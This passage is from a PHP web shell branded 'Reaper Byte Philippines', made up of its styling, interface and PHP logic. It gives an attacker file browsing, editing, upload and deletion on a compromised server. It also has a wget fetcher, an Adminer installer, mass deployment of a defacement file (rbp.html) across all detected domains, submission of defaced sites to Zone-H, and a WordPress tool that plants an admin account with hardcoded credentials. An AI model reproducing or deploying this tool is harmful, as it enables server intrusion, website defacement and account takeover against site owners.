            cursor: pointer;
            margin: 5px;
        }
        
        .popup-content button:hover {
            background: #333;
        }
        
        .file-selector {
            background: #2a2a2a;
            border: 1px solid #444;
            border-radius: 5px;
            padding: 10px;
            margin: 10px 0;
            max-height: 200px;
            overflow-y: auto;
        }
        
        .file-selector-item {
            padding: 5px;
            margin: 2px 0;
            background: #333;
            border-radius: 3px;
            cursor: pointer;
            font-size: 12px;
        }
        
        .file-selector-item:hover {
            background: #444;
        }
        
        .file-selector-item.selected {
            background: #007acc;
        }
        
        .domain-info {
            background: #2a2a2a;
            border: 1px solid #444;
            border-radius: 5px;
            padding: 10px;
            margin: 10px 0;
            max-height: 150px;
            overflow-y: auto;
        }
        
        .domain-item {
            padding: 3px;
            margin: 1px 0;
            font-size: 11px;
            color: #aaa;
        }
        
        .results-popup {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            z-index: 2000;
        }
        
        .results-content {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #1a1a1a;
            padding: 20px;
            border-radius: 10px;
            border: 2px solid #444;
            color: #fff;
            width: 800px;
            max-height: 80vh;
            overflow-y: auto;
        }
        
        .success-box {
            background: #1a3c1a;
            border: 2px solid #4CAF50;
            border-radius: 8px;
            padding: 20px;
            margin: 15px 0;
        }
        
        .login-link {
            display: inline-block;
            background: #4CAF50;
            color: white;
            padding: 12px 24px;
            text-decoration: none;
            border-radius: 5px;
            font-weight: bold;
            margin: 10px 0;
            transition: all 0.3s ease;
        }
        
        .login-link:hover {
            background: #45a049;
            transform: translateY(-2px);
        }
        
        .error-box {
            background: #3c1a1a;
            border: 2px solid #f44336;
            border-radius: 8px;
            padding: 20px;
            margin: 15px 0;
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo-container">
            <img src="https://i.ibb.co/274V1hJ0/unnamed-14-removebg-preview.png" class="logo" alt="RBP Logo">
            <div class="logo-text">Reaper Byte Philippines</div>
        </div>
        
        <div class="toolbar">
            <button class="tool-button" onclick="RBPshowAdminerPopup()">Adminer</button>
            <button class="tool-button" onclick="RBPshowZoneHPopup()">Zone-H</button>
            <button class="tool-button" onclick="RBPshowWPEditUserPopup()">Edit WordPress User</button>
            <button class="tool-button" onclick="RBPshowWgetPopup()">WGET Download</button>
            <button class="tool-button" onclick="RBPshowMassDeployPopup()">Auto Mass Deploy</button>
        </div>
        
        <div class="upload-section">
            <form method="post" enctype="multipart/form-data">
                <input type="file" name="u" style="color:#fff;background:#333;padding:5px;border-radius:3px;border:1px solid #555;">
                <input type="submit" name="s" value="Upload" class="tool-button">
            </form>
        </div>
    </div>

    <!-- Results Popup -->
    <div id="resultsPopup" class="results-popup">
        <div class="results-content">
            <?php
            if (isset($_SESSION['mass_deploy_results'])) {
                $results = $_SESSION['mass_deploy_results'];
                $sourceFile = $_SESSION['mass_deploy_source'];
                $baseDir = $_SESSION['mass_deploy_base'];
                
                echo '<h3>Mass Deploy Results</h3>';
                echo '<p><strong>Source File:</strong> ' . htmlspecialchars($sourceFile) . '</p>';
                echo '<p><strong>Base Directory:</strong> ' . htmlspecialchars($baseDir) . '</p>';
                echo '<div style="max-height: 400px; overflow-y: auto; border: 1px solid #444; padding: 10px; background: #2a2a2a;">';
                
                if (isset($results['error'])) {
                    echo '<p style="color: red;">' . htmlspecialchars($results['error']) . '</p>';
                } else {
                    foreach ($results as $result) {
                        $color = strpos($result, 'Deployed') !== false ? 'lime' : (strpos($result, 'Failed') !== false ? 'red' : 'yellow');
                        echo '<p style="color: ' . $color . '; margin: 2px 0; font-size: 12px;">' . htmlspecialchars($result) . '</p>';
                    }
                }
                
                echo '</div>';
                
                // Clear session
                unset($_SESSION['mass_deploy_results']);
                unset($_SESSION['mass_deploy_source']);
                unset($_SESSION['mass_deploy_base']);
            } elseif (isset($_SESSION['mass_delete_results'])) {
                $results = $_SESSION['mass_delete_results'];
                $filename = $_SESSION['mass_delete_filename'];
                $baseDir = $_SESSION['mass_delete_base'];
                
                echo '<h3>Mass Delete Results</h3>';
                echo '<p><strong>Target Filename:</strong> ' . htmlspecialchars($filename) . '</p>';
                echo '<p><strong>Base Directory:</strong> ' . htmlspecialchars($baseDir) . '</p>';
                echo '<div style="max-height: 400px; overflow-y: auto; border: 1px solid #444; padding: 10px; background: #2a2a2a;">';
                
                foreach ($results as $result) {
                    $color = strpos($result, 'Deleted') !== false ? 'lime' : (strpos($result, 'Not found') !== false ? 'red' : 'yellow');
                    echo '<p style="color: ' . $color . '; margin: 2px 0; font-size: 12px;">' . htmlspecialchars($result) . '</p>';
                }
                
                echo '</div>';
                
                // Clear session
                unset($_SESSION['mass_delete_results']);
                unset($_SESSION['mass_delete_filename']);
                unset($_SESSION['mass_delete_base']);
            } elseif (isset($_SESSION['wp_edit_results'])) {
                $result = $_SESSION['wp_edit_results'];
                
                echo '<h3>WordPress User Editor</h3>';
                
                if (isset($result['error'])) {
                    echo '<div class="error-box">';
                    echo '<p style="color: #ff6b6b; font-size: 16px; margin: 0;">' . htmlspecialchars($result['error']) . '</p>';
                    if (isset($result['current_dir'])) {
                        echo '<p style="color: #ccc; font-size: 12px; margin-top: 10px;">Current directory: ' . htmlspecialchars($result['current_dir']) . '</p>';
                    }
                    if (isset($result['searched_paths'])) {
                        echo '<p style="color: #ccc; font-size: 12px; margin-top: 5px;">' . htmlspecialchars($result['searched_paths']) . '</p>';
                    }
                    echo '</div>';
                } elseif (isset($result['success'])) {
                    echo '<div class="success-box">';
                    echo '<p style="color: #4CAF50; font-size: 18px; font-weight: bold; margin-bottom: 15px;">' . htmlspecialchars($result['success']) . '</p>';
                    echo '<p style="color: #fff; margin: 10px 0;"><strong>' . htmlspecialchars($result['credentials']) . '</strong></p>';
                    
                    if (isset($result['login_url'])) {
                        echo '<a href="' . htmlspecialchars($result['login_url']) . '" target="_blank" class="login-link">';
                        echo 'Login to WordPress Admin';
                        echo '</a>';
                        echo '<p style="color: #ccc; font-size: 14px; margin-top: 10px;">';
                        echo 'Login URL: ' . htmlspecialchars($result['login_url']);
                        echo '</p>';
                    }
                    
                    if (isset($result['wp_config_path'])) {
                        echo '<p style="color: #ccc; font-size: 12px; margin-top: 15px;">';
                        echo 'Using wp-config.php at: ' . htmlspecialchars($result['wp_config_path']);
                        echo '</p>';
                    }
                    
                    if (isset($result['wp_directory_found'])) {
                        echo '<p style="color: #ccc; font-size: 12px; margin-top: 10px;">';
                        echo 'WordPress directory found: ' . htmlspecialchars($result['wp_directory_found']);
                        echo '</p>';
                    }
                    
                    echo '</div>';
                }
                
                // Clear session
                unset($_SESSION['wp_edit_results']);
            } elseif (isset($_SESSION['zoneh_results'])) {
                $zonehResults = $_SESSION['zoneh_results'];
                $nick = $zonehResults['nick'];
                $domainList = $zonehResults['domains'];
                
                echo '<h3>Zone-H Notifier</h3>';
                echo '<p><strong>Notifier Archive:</strong> <a href="http://zone-h.org/archive/notifier=' . $nick . '" target="_blank">http://zone-h.org/archive/notifier=' . $nick . '</a></p>';
                echo '<div style="max-height: 300px; overflow-y: auto; border: 1px solid #444; padding: 10px; background: #2a2a2a;">';
                
                foreach ($domainList as $url) {
                    $url = trim($url);
                    if ($url) {
                        $submittedUrl = $url . '/rbp.html';
                        echo '<p>' . htmlspecialchars($url) . ' -> <span style="color:lime;">SUBMITTED</span> (' . htmlspecialchars($submittedUrl) . ')</p>';
                    }
                }
                
                echo '</div>';
                
                // Clear session
                unset($_SESSION['zoneh_results']);
            }
            ?>
            <div style="text-align: center; margin-top: 15px;">
                <button class="tool-button" onclick="RBPcloseResultsPopup()">Close</button>
            </div>
        </div>
    </div>

    <!-- WGET Popup -->
    <div id="wgetPopup" class="popup-overlay">
        <div class="popup-content">
            <h3>WGET Download</h3>
            <p>Enter URL to download file:</p>
            <input type="text" id="wgetUrl" placeholder="https://example.com/file.txt" value="https://">
            <div style="text-align: center; margin-top: 15px;">
                <button class="tool-button" onclick="RBPsubmitWget()">Download</button>
                <button class="tool-button" onclick="RBPclosePopup('wgetPopup')">Cancel</button>
            </div>
        </div>
    </div>

    <!-- Adminer Popup -->
    <div id="adminerPopup" class="popup-overlay">
        <div class="popup-content">
            <div id="adminerContent">
                <h3>Adminer Downloader</h3>
                <p>Download and install Adminer database management tool.</p>
                <div style="text-align: center; margin-top: 15px;">
                    <button class="tool-button" onclick="RBPsubmitAdminer()">Download Adminer</button>
                    <button class="tool-button" onclick="RBPclosePopup('adminerPopup')">Cancel</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Zone-H Popup -->
    <div id="zonehPopup" class="popup-overlay">
        <div class="popup-content">
            <div id="zonehContent">
                <h3>Zone-H Notifier</h3>
                <p>Defacer Name:</p>
                <input type="text" id="zoneh_nick" value="RBP">
                <p>Domains (one per line):</p>
                <textarea id="zoneh_url" rows="10" placeholder="example.com&#10;example.net&#10;example.org"></textarea>
                <div style="text-align: center; margin-top: 15px;">
                    <button class="tool-button" onclick="RBPsubmitZoneH()">Submit to Zone-H</button>
                    <button class="tool-button" onclick="RBPclosePopup('zonehPopup')">Cancel</button>
                </div>
                <p><small>Note: Each domain will automatically have /rbp.html added</small></p>
            </div>
        </div>
    </div>

    <!-- Mass Deploy Popup -->
    <div id="massDeployPopup" class="popup-overlay">
        <div class="popup-content">
            <div id="massDeployContent">
                <h3>Auto Mass Deploy</h3>
                
                <div class="domain-info" id="domainInfo">
                    <p>Auto-detected base directory: <?php echo htmlspecialchars($baseDir); ?></p>
                    <?php
                    $domains = RBPgetAllSubdomains($baseDir);
                    foreach ($domains as $domain) {
                        echo '<div class="domain-item">' . htmlspecialchars($domain['name']) . ' -> ' . htmlspecialchars($domain['path']) . '</div>';
                    }
                    if (count($domains) === 0) {
                        echo '<p style="color: red;">No domains found in base directory!</p>';
                    } else {
                        echo '<p style="color: lime;">Found ' . count($domains) . ' domains/subdomains</p>';
                    }
                    ?>
                </div>
                
                <p><strong>Select File to Deploy:</strong></p>
                <div id="fileList" class="file-selector">
                    <?php
                    $files = [];
                    if (is_dir($currentDir) && $handle = opendir($currentDir)) {
                        while (false !== ($entry = readdir($handle))) {
                            if ($entry != "." && $entry != ".." && !is_dir($currentDir . '/' . $entry)) {
                                $files[] = $entry;
                            }
                        }
                        closedir($handle);
                    }
                    foreach ($files as $file) {
                        echo '<div class="file-selector-item" onclick="RBPselectFile(\'' . htmlspecialchars($file) . '\')">' . htmlspecialchars($file) . '</div>';
                    }
                    ?>
                </div>
                
                <p><strong>Selected File Path:</strong></p>
                <input type="text" id="deploy_file_path" placeholder="/path/to/your/file.html" readonly>
                
                <div style="text-align: center; margin-top: 15px;">
                    <button class="tool-button" onclick="RBPsubmitMassDeploy()">Deploy to All Domains</button>
                    <button class="tool-button" onclick="RBPsubmitMassDelete()">Delete from All Domains</button>
                    <button class="tool-button" onclick="RBPdownloadDomains()">Download Domains List</button>
                    <button class="tool-button" onclick="RBPclosePopup('massDeployPopup')">Cancel</button>
                </div>
                
                <p><small>This will automatically deploy the selected file to ALL detected subdomains in: <?php echo htmlspecialchars($baseDir); ?></small></p>
            </div>
        </div>
    </div>

    <!-- WordPress Edit User Popup -->
    <div id="wpedituserPopup" class="popup-overlay">
        <div class="popup-content">
            <div id="wpedituserContent">
                <h3>WordPress User Editor</h3>
                <p>This will automatically:</p>
                <ul style="text-align: left; margin: 15px 0; padding-left: 20px;">
                    <li>Search for wp-config.php in current and parent directories</li>
                    <li>Create/update admin user</li>
                    <li>Set default credentials</li>
                    <li>Reset active plugins</li>
                    <li>Restore clean WordPress</li>
                </ul>
                <p><strong>Default Credentials:</strong></p>
                <p style="background: #2a2a2a; padding: 10px; border-radius: 5px; border: 1px solid #444;">
                    Username: <strong>ReaperBythe222@</strong><br>
                    Password: <strong>ReaperBythe222@</strong>
                </p>
                <p style="color: #ccc; font-size: 12px;">Current directory: <?php echo htmlspecialchars($currentDir); ?></p>
                <div style="text-align: center; margin-top: 15px;">
                    <button class="tool-button" style="background: #4CAF50; border-color: #4CAF50;" onclick="RBPsubmitWPEditUser()">Edit WordPress User</button>
                    <button class="tool-button" onclick="RBPclosePopup('wpedituserPopup')">Cancel</button>
                </div>
                <p><small>Note: Will search for wp-config.php automatically from current directory</small></p>
            </div>
        </div>
    </div>

    <script>
        function RBPpostDir(dir) {
            window.location.href = '?d=' + btoa(dir);
        }
        
        function RBPpostDel(path) {
            if (confirm('Are you sure you want to delete this file?')) {
                var form = document.createElement("form");
                form.method = "post";
                form.action = "";
                var input = document.createElement("input");
                input.name = "del";
                input.value = btoa(path);
                form.appendChild(input);
                document.body.appendChild(form);
                form.submit();
            }
        }
        
        function RBPpostEdit(path) {
            var form = document.createElement("form");
                form.method = "post";
                form.action = "";
                var input = document.createElement("input");
                input.name = "edit";
                input.value = btoa(path);
                form.appendChild(input);
                document.body.appendChild(form);
                form.submit();
        }
        
        function RBPpostRen(path, name) {
            var newName = prompt("New name:", name);
            if (newName && newName !== name) {
                var form = document.createElement("form");
                form.method = "post";
                form.action = "";
                var input1 = document.createElement("input");
                input1.name = "ren";
                input1.value = btoa(path);
                var input2 = document.createElement("input");
                input2.name = "new";
                input2.value = newName;
                form.appendChild(input1);
                form.appendChild(input2);
                document.body.appendChild(form);
                form.submit();
            }
        }
        
        function RBPpostDownload(path) {
            var form = document.createElement("form");
            form.method = "post";
            form.action = "";
            var input = document.createElement("input");
            input.name = "download_file";
            input.value = btoa(path);
            form.appendChild(input);
            document.body.appendChild(form);
            form.submit();
        }
        
        function RBPpostOpen(path) {
            window.open(path, '_blank');
        }
        
        function RBPshowWgetPopup() {
            document.getElementById('wgetPopup').style.display = 'block';
        }
        
        function RBPshowAdminerPopup() {
            document.getElementById('adminerPopup').style.display = 'block';
        }
        
        function RBPshowZoneHPopup() {
            document.getElementById('zonehPopup').style.display = 'block';
        }
        
        function RBPshowWPEditUserPopup() {
            document.getElementById('wpedituserPopup').style.display = 'block';
        }
        
        function RBPshowMassDeployPopup() {
            document.getElementById('massDeployPopup').style.display = 'block';
        }
        
        function RBPselectFile(filename) {
            var items = document.getElementsByClassName('file-selector-item');
            for (var i = 0; i < items.length; i++) {
                items[i].classList.remove('selected');
            }
            event.target.classList.add('selected');
            document.getElementById('deploy_file_path').value = '<?php echo $currentDir; ?>/' + filename;
        }
        
        function RBPclosePopup(popupId) {
            document.getElementById(popupId).style.display = 'none';
        }
        
        function RBPcloseResultsPopup() {
            document.getElementById('resultsPopup').style.display = 'none';
        }
        
        function RBPsubmitWget() {
            var url = document.getElementById('wgetUrl').value;
            if (url) {
                var form = document.createElement("form");
                form.method = "post";
                form.action = "";
                var input1 = document.createElement("input");
                input1.name = "wget_url";
                input1.value = url;
                form.appendChild(input1);
                document.body.appendChild(form);
                form.submit();
            }
        }
        
        function RBPsubmitAdminer() {
            var form = document.createElement("form");
            form.method = "post";
            form.action = "";
            var input1 = document.createElement("input");
            input1.name = "download_adminer";
            input1.value = "1";
            form.appendChild(input1);
            document.body.appendChild(form);
            form.submit();
        }
        
        function RBPsubmitZoneH() {
            var form = document.createElement("form");
            form.method = "post";
            form.action = "";
            var input1 = document.createElement("input");
            input1.name = "zoneh_nick";
            input1.value = document.getElementById('zoneh_nick').value;
            var input2 = document.createElement("input");
            input2.name = "zoneh_url";
            input2.value = document.getElementById('zoneh_url').value;
            var input3 = document.createElement("input");
            input3.name = "zoneh_submit";
            input3.value = "1";
            form.appendChild(input1);
            form.appendChild(input2);
            form.appendChild(input3);
            document.body.appendChild(form);
            form.submit();
        }
        
        function RBPsubmitMassDeploy() {
            var form = document.createElement("form");
            form.method = "post";
            form.action = "";
            var input1 = document.createElement("input");
            input1.name = "deploy_file_path";
            input1.value = document.getElementById('deploy_file_path').value;
            var input2 = document.createElement("input");
            input2.name = "mass_deploy";
            input2.value = "1";
            form.appendChild(input1);
            form.appendChild(input2);
            document.body.appendChild(form);
            form.submit();
        }
        
        function RBPsubmitMassDelete() {
            var form = document.createElement("form");
            form.method = "post";
            form.action = "";
            var input1 = document.createElement("input");
            input1.name = "deploy_file_path";
            input1.value = document.getElementById('deploy_file_path').value;
            var input2 = document.createElement("input");
            input2.name = "mass_delete";
            input2.value = "1";
            form.appendChild(input1);
            form.appendChild(input2);
            document.body.appendChild(form);
            form.submit();
        }
        
        function RBPdownloadDomains() {
            var extension = prompt("Enter file extension (e.g., rbp.html) or leave blank for domain only:", "rbp.html");
            if (extension !== null) {
                window.open('?download=1&extension=' + encodeURIComponent(extension), '_blank');
            }
        }
        
        function RBPsubmitWPEditUser() {
            var form = document.createElement("form");
            form.method = "post";
            form.action = "";
            var input1 = document.createElement("input");
            input1.name = "wp_edit_user_submit";
            input1.value = "1";
            form.appendChild(input1);
            document.body.appendChild(form);
            form.submit();
        }
        
        // Auto-show results popup if there are results
        window.onload = function() {
            <?php if (isset($_SESSION['mass_deploy_results']) || isset($_SESSION['mass_delete_results']) || isset($_SESSION['wp_edit_results']) || isset($_SESSION['zoneh_results'])): ?>
            document.getElementById('resultsPopup').style.display = 'block';
            <?php endif; ?>
        };
    </script>

<?php
// Only show file listing if not in edit/rename mode
if (!isset($_POST['edit']) && !isset($_POST['ren'])) {
    // Directory Navigation
    $pathParts = explode("/", $currentDir);
    echo "<div class=\"dir-path\">";
    foreach ($pathParts as $k => $v) {
        if ($v == "" && $k == 0) {
            echo "<a href=\"javascript:void(0);\" onclick=\"RBPpostDir('/')\">/</a>";
            continue;
        }
        $dirPath = implode("/", array_slice($pathParts, 0, $k + 1));
        echo "<a href=\"javascript:void(0);\" onclick=\"RBPpostDir('" . addslashes($dirPath) . "')\">$v</a>/";
    }
    echo "</div>";

    // File/Folder Listing
    $items = @scandir($currentDir);
    if ($items !== false) {
        echo "<div class='file-list'>";
        foreach ($items as $item) {
            $fullPath = $currentDir . '/' . $item;
            if ($item == '.' || $item == '..') continue;

            if (is_dir($fullPath)) {
                echo "<div class='file-item folder' onclick=\"RBPpostDir('" . addslashes($fullPath) . "')\">
                        <div class='file-icon'>📁</div>
                        <div class='file-name'>$item</div>
                        <div class='file-size'>--</div>
                        <div class='file-actions'>
                            <button onclick=\"RBPpostRen('" . addslashes($fullPath) . "', '$item')\">Rename</button>
                        </div>
                      </div>";
            } else {
                $size = filesize($fullPath);
                $sizeFormatted = $size >= 1048576 ? round($size / 1048576, 2) . ' MB' : ($size >= 1024 ? round($size / 1024, 2) . ' KB' : $size . ' B');
                echo "<div class='file-item file'>
                        <div class='file-icon'>📄</div>
                        <div class='file-name' onclick=\"RBPpostOpen('" . addslashes($fullPath) . "')\">$item</div>
                        <div class='file-size'>$sizeFormatted</div>
                        <div class='file-actions'>
                            <button onclick=\"RBPpostDownload('" . addslashes($fullPath) . "')\">Download</button>
                            <button onclick=\"RBPpostDel('" . addslashes($fullPath) . "')\">Delete</button>
                            <button onclick=\"RBPpostEdit('" . addslashes($fullPath) . "')\">Edit</button>
                            <button onclick=\"RBPpostRen('" . addslashes($fullPath) . "', '$item')\">Rename</button>
                        </div>
                      </div>";
            }
        }
        echo "</div>";
    } else {
        echo "<p>Unable to read directory!</p>";
    }
}

// Edit File (only shows when editing)
if (isset($_POST['edit'])) {
    $filePath = base64_decode($_POST['edit']);
    $fileDir = dirname($filePath);
    if (file_exists($filePath)) {
        echo "<style>.file-list{display:none;}</style>";
        echo "<div style='padding: 20px;'>";
        echo "<a href=\"javascript:void(0);\" onclick=\"RBPpostDir('" . addslashes($fileDir) . "')\" style='color: white; text-decoration: none; font-weight: bold;'>&larr; Back</a>";
        echo "<h3 style='color: white; margin: 15px 0;'>Editing: " . basename($filePath) . "</h3>";
        echo "<form method=\"post\">";
        echo "<input type=\"hidden\" name=\"obj\" value=\"" . $_POST['edit'] . "\">";
        echo "<input type=\"hidden\" name=\"d\" value=\"" . base64_encode($fileDir) . "\">";
        echo "<textarea name=\"content\" style='width: 100%; height: 500px; background: #1a1a1a; color: #fff; border: 1px solid #444; border-radius: 5px; padding: 15px; font-family: monospace;'>" . htmlspecialchars(file_get_contents($filePath)) . "</textarea>";
        echo "<div style='text-align: center; margin-top: 15px;'>";
        echo "<button type=\"submit\" name=\"save\" class=\"tool-button\" style='padding: 10px 20px; font-size: 14px;'>Save File</button>";
        echo "</div>";
        echo "</form>";
        echo "</div>";
    }
}

// Rename form (only shows when renaming without new name)
if (isset($_POST['ren']) && !isset($_POST['new'])) {
    $oldPath = base64_decode($_POST['ren']);
    $oldDir = dirname($oldPath);
    echo "<style>.file-list{display:none;}</style>";
    echo "<div style='padding: 20px;'>";
    echo "<a href=\"javascript:void(0);\" onclick=\"RBPpostDir('" . addslashes($oldDir) . "')\" style='color: white; text-decoration: none; font-weight: bold;'>&larr; Back</a>";
    echo "<h3 style='color: white; margin: 15px 0;'>Renaming: " . basename($oldPath) . "</h3>";
    echo "<form method=\"post\">";
    echo "<input type=\"hidden\" name=\"ren\" value=\"" . $_POST['ren'] . "\">";
    echo "<input type=\"hidden\" name=\"d\" value=\"" . base64_encode($oldDir) . "\">";
    echo "<p>New Name: <input name=\"new\" type=\"text\" value=\"" . basename($oldPath) . "\" style='color:#000;padding:5px;'></p>";
    echo "<input type=\"submit\" value=\"Rename\" class=\"tool-button\" style='padding: 10px 20px; font-size: 14px;'>";
    echo "</form>";
    echo "</div>";
}
?>
</body>
</html>
